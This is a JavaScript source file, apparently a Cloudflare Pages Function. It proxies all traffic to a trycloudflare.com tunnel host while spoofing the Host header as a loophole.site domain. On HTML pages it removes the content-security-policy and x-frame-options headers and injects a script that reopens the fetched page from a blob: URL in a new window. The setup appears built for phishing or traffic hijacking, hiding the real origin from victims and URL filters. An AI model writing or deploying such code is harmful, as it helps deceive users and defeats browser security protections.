export async function onRequest(context) {
  const incomingUrl = new URL(context.request.url)

  // If this is the ?_blob=1 request, strip the param and serve normally (no injection)
  if (incomingUrl.searchParams.get('_blob') === '1') {
    incomingUrl.searchParams.delete('_blob')
    const target = new URL("https://experiment-cultures-unexpected-sympathy.trycloudflare.com")
    target.pathname = incomingUrl.pathname || ""
    target.search = incomingUrl.search
    const headers = new Headers(context.request.headers)
    headers.set("host", "6c642c4f7a9fbc4c1939eccc19418e91.loophole.site")
    return fetch(target.toString(), {
      method: context.request.method,
      headers,
      body: context.request.body
    })
  }

  const target = new URL("https://experiment-cultures-unexpected-sympathy.trycloudflare.com")
  target.pathname = incomingUrl.pathname || ""
  target.search = incomingUrl.search

  const headers = new Headers(context.request.headers)
  headers.set("host", "6c642c4f7a9fbc4c1939eccc19418e91.loophole.site")

  const response = await fetch(target.toString(), {
    method: context.request.method,
    headers,
    body: context.request.body
  })

  const contentType = response.headers.get("content-type") || ""
  if (!contentType.includes("text/html")) {
    return response
  }

  let html = await response.text()

  // The blob URL points to YOUR proxy with ?_blob=1 — so it fetches real HTML but no injection
  const blobPageUrl = incomingUrl.origin + incomingUrl.pathname + '?_blob=1'

  const script = `
<script>
  (function() {
    if (sessionStorage.getItem('_popped')) return;
    sessionStorage.setItem('_popped', '1');

    fetch('${blobPageUrl}')
      .then(r => r.text())
      .then(html => {
        const blob = new Blob([html], { type: 'text/html' });
        const url = URL.createObjectURL(blob);
        window.open(url, '_blank');
        setTimeout(() => URL.revokeObjectURL(url), 5000);
      });
  })();
<\/script>`

  if (/<\/head>/i.test(html)) {
    html = html.replace(/<\/head>/i, script + '</head>')
  } else {
    html = script + html
  }

  const newHeaders = new Headers(response.headers)
  newHeaders.delete("content-security-policy")
  newHeaders.delete("content-security-policy-report-only")
  newHeaders.delete("x-frame-options")
  newHeaders.set("content-type", "text/html; charset=utf-8")

  return new Response(html, {
    status: response.status,
    headers: newHeaders
  })
}
